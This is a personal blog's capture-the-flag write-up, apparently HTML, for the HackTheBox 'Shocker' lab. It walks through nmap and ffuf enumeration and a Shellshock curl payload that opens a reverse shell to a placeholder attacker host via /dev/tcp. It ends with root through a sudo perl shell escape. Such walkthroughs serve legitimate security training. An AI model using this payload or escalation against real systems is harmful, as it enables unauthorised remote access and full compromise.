@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Shoker">
+  <meta property="og:description" content="HackTheBox - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Shoker</title>
+  <meta name="description" content="HackTheBox - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto">
+<a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Shoker</b></h1>
+
+<p class="post-metadata text-muted">
+  22 October 2023 -  
+  <b>3 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#shellshock">
+      <span class="tag badge badge-pill text-primary border border-primary">Shellshock</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#cgiexploitation">
+      <span class="tag badge badge-pill text-primary border border-primary">CGIExploitation</span>
+    </a>
+    </p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p><img src="/assets/ctf/htb_media/shoker_infocard.png" alt="info card"></p>
+
+<h1 id="exploiting-the-shocker-machine-on-hackthebox-a-detailed-walkthrough">Exploiting the Shocker Machine on HackTheBox: A Detailed Walkthrough</h1>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Shocker is an easy machine on HackTheBox that involves exploiting the Shellshock vulnerability to gain initial access and leveraging sudo permissions for privilege escalation. This walkthrough will guide you through the process of compromising the Shocker machine, from initial reconnaissance to gaining root access.</p>
+
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> 10.10.10.56 <span class="o">&gt;</span> nmap/service.log
+</code></pre></div></div>
+
+<p><strong>Nmap Results:</strong></p>
+
+<pre><code class="language-nmap">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 10:28 EST
+Nmap scan report for 10.10.10.56
+Host is up (0.39s latency).
+
+PORT      STATE  SERVICE      VERSION
+80/tcp    open   http         Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp  open   ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+25000/tcp closed icl-twobase1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.37 seconds
+</code></pre>
+
+<p><strong>Key Services Identified:</strong></p>
+
+<ul>
+  <li>
+<strong>HTTP (80):</strong> Apache httpd 2.4.18</li>
+  <li>
+<strong>SSH (2222):</strong> OpenSSH 7.2p2</li>
+</ul>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Visiting the HTTP service on port 80 revealed a simple webpage with no significant content.</p>
+
+<p><strong>Webpage:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/shoker_webpage.png" alt="Webpage"></p>
+
+<p><strong>Directory Brute-Forcing:</strong></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">ffuf</code>, we discovered a directory named <code class="language-plaintext highlighter-rouge">cgi-bin</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://10.10.10.56/FUZZ
+</code></pre></div></div>
+
+<p><strong>Key Directory Identified:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/cgi-bin</code></li>
+</ul>
+
+<p><strong>Recursive Directory Brute-Forcing:</strong></p>
+
+<p>We performed a recursive scan on <code class="language-plaintext highlighter-rouge">/cgi-bin</code> for <code class="language-plaintext highlighter-rouge">.bin</code>, <code class="language-plaintext highlighter-rouge">.sh</code>, and <code class="language-plaintext highlighter-rouge">.cgi</code> extensions, revealing a file named <code class="language-plaintext highlighter-rouge">user.sh</code>.</p>
+
+<p><strong>Discovered File:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/shoker_user.png" alt="User.sh"></p>
+
+<h2 id="exploiting-shellshock">Exploiting Shellshock</h2>
+
+<h3 id="understanding-shellshock">Understanding Shellshock</h3>
+
+<p>Shellshock is a vulnerability in the Unix Bash shell that allows remote code execution. It affects systems that use Bash to process requests, such as CGI scripts.</p>
+
+<h3 id="crafting-the-payload">Crafting the Payload</h3>
+
+<p>We crafted a payload to exploit the Shellshock vulnerability and gain a reverse shell.</p>
+
+<p><strong>Payload:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-A</span> “<span class="o">()</span> <span class="o">{</span> :<span class="p">;</span> <span class="o">}</span><span class="p">;</span> /bin/bash <span class="nt">-i</span> <span class="o">&gt;</span> /dev/tcp/attacker_ip/port 0&lt;&amp;1 2&gt;&amp;1” http://10.10.10.56/cgi-bin/user.sh
+</code></pre></div></div>
+
+<p><strong>Payload Breakdown:</strong></p>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">/bin/bash -i</code>: Defines that the shell must be interactive.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">&gt; /dev/tcp/attacker_ip/port</code>: Redirects the output of the shell to the attacker via a TCP connection.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">0&lt;&amp;1 2&gt;&amp;1</code>: Indicates that input comes from the TCP connection, and output goes to the same TCP connection.</li>
+</ul>
+
+<h3 id="gaining-initial-access">Gaining Initial Access</h3>
+
+<p>Executing the payload provided a reverse shell on the machine.</p>
+
+<p><strong>Reverse Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/shoker_userflag.png" alt="User Flag"></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="enumerating-sudo-permissions">Enumerating Sudo Permissions</h3>
+
+<p>We checked the sudo permissions available to the current user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><strong>Sudo Permissions:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User shelly may run the following commands on shocker:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
+</code></pre></div></div>
+
+<h3 id="exploiting-sudo-permissions">Exploiting Sudo Permissions</h3>
+
+<p>Using the sudo permissions, we escalated privileges to root by executing a shell with Perl.</p>
+
+<p><strong>Privilege Escalation Command:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>perl <span class="nt">-e</span> <span class="s1">'exec "/bin/sh";'</span>
+</code></pre></div></div>
+
+<p><strong>Root Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/shoker_root.png" alt="Root Shell"></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The Shocker machine on HackTheBox provided a comprehensive challenge, encompassing web application enumeration, Shellshock exploitation, and privilege escalation through sudo permissions. By methodically enumerating services and exploiting discovered vulnerabilities, we successfully compromised the machine and gained root access. This walkthrough underscores the importance of thorough enumeration and the effective use of discovered vulnerabilities in penetration testing.</p>
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+<a class="social mx-1" href="mailto:akschavan100@gmail.com" style="color: #6c757d" onmouseover="this.style.color='#db4437'" onmouseout="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.github.com/akshaychavan10" style="color: #6c757d" onmouseover="this.style.color='#333333'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.linkedin.com/in/akshaychavan07" style="color: #6c757d" onmouseover="this.style.color='#007bb5'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div>
+<small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
